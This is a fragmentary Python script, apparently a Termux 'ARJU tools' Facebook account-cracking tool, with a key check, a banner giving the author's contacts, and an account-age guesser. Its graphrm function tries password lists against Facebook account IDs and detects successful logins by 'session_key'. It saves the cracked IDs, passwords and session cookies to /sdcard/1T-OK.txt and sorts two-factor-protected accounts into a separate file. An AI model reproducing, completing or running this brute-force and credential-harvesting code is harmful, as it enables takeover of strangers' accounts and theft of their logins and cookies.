...
MY_KEY = open('/data/data/com.termux/files/usr/lib/.myawm.txt','r').ra
        ...
        try:
            ...
            if MY_KEY in check_key:
                ...
                os.system('xdg-open https://wa.me/+8801798615245')
                os.system('xdg-open https://wa.me/+8801798615245')
                time.sleep(59)
...
def ARJU(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :arjuz = '2009'
		elif fx[:9] in ['100000000']       :arjuz = '2009'
		elif fx[:8] in ['10000000']        :arjuz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:arjuz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:arjuz = '2010'
		elif fx[:6] in ['100001']          :arjuz = '2010/2011'
		elif fx[:6] in ['100002','100003'] :arjuz = '2011/2012'
		elif fx[:6] in ['100004']          :arjuz = '2012/2013'
		elif fx[:6] in ['100005','100006'] :arjuz = '2013/2014'
		elif fx[:6] in ['100007','100008'] :arjuz = '2014/2015'
		elif fx[:6] in ['100009']          :arjuz = '2015'
		elif fx[:5] in ['10001']           :arjuz = '2015/2016'
		elif fx[:5] in ['10002']           :arjuz = '2016/2017'
		elif fx[:5] in ['10003']           :arjuz = '2018/2019'
		elif fx[:5] in ['10004']           :arjuz = '2019'
		elif fx[:5] in ['10005']           :arjuz = '2020'
		elif fx[:5] in ['10006','10007','10008']:arjuz = '2021/2022'
		else:arjuz='2023'
	elif len(fx) in [9,10]:
		arjuz = '2008/2009'
	elif len(fx)==8:
...
#os.system('espeak -a 300 "well,come to,ARJU tools"')
#os.system('xdg-open https://www.facebook.com/profile.php?id=arju.09242')
def logo():
	os.system('clear');print(f"""\r\r
\033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║\033[10;91m          ████            ███████       10;91m ██       ██10;91m██10;91m
║\033[10;91m      ██         ██       ██         ██       10;91m ██       ██10;91m██10;91m
║\033[10;91m      ███████        ███████        10;91m██       ██10;91m██10;91m
║\033[10;91m      ██         ██       ██           ██    ██          ██       ██           ██10;91m
║\033[10;91m      ██         ██       ██10;91m██  ███████           ██████10;91m
\033[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝               \033[0;92m
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━﻿━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
\033[10;93m╠══[Author                   • \33[1;38mARJU ]     ║ 
\033[10;91m╠══[Facebook                 • ARJU AHAMED ]   ║    
\033[10;97m╠══[Github                   • ARJU AHAMED ]   ║   
\033[10;94m╠══[Whatsapp                 • 01798615245 ]  ║ 
\033[10;95m╠══[TOOLS                    • FREE ]         ║    
\033[10;93m╠══[VERSION                  • 2.2 ]          ║ \033[10;92m
...
def rmenu1():
	...
	if "4" in rcd:os.system('xdg-open https://t.me/Arju09242');exit()
	if "5" in rcd:os.system('xdg-open https://www.facebook.com/arju.09242');exit()
	if "0" in rcd:exit()
...
def graphrm(id,psd,tid):
	global ok,cp,lk,lop
	togg=[]
	sys.stdout.write(f'\r\r\033[10;97m[\033[10;92m=\033[10;97m]\033[10;91m~\033[10;97m[\033[10;92mArju\033[10;97m-\033[10;92mM1\033[10;97m]>~[\033[10;92m{lop}\033[10;97m]>~<[\033[10;92m{tid}\033[10;97m]>~[\033[10;92mOK\033[10;91m•\033[10;92m%s\033[10;91m/\033[10;93m%s\033[10;97m] '%(len(ok),len(lk)));sys.stdout.flush()
	#sys.stdout.write(f'\r\r\033[10;97m[\033[10;92m=\033[10;97m]\033[10;91m~\033[10;97m[\033[10;92mArju\033[10;97m-\033[10;92mM1\033[10;97m]>~[\033[10;92m{lop}\033[10;97m]>~<[\033[10;92m{tid}\033[10;97m]>~[\033[10;92mOK:%s\033[10;97m]>~<[\033[10;95mCp:%s\033[10;97m] '%(len(ok),len(lk)));sys.stdout.flush()
	for psw in psd:
		...
		if 'session_key' in lo:
			...
			print(f'\r\r\033[10;92m[Arju-Ok💚] {iid} | {psw} \033[10;91m•> \033[10;92m{Arju(iid)}');os.syst﻿em('espeak -a 300 "Arju,  Ok,  id"');ok.append(id);open('/sdcard/1T-OK.txt', 'a').write(iid+' | '+psw+' | '+id+'  ------------>>>'+coki+"\n")
			...
			print(f'\r\r\033[10;97m[\033[10;92m=\033[10;97m]\033[10;91m~\033[10;96m[Arju-2F] {iid} | {psw}{W}');os.system('espeak -a 300 "2F"');open('/sdcard/1T-2F.txt', 'a').write(iid+' | '+psw+' | '+id+"\n")
			twf.append(id)
			break
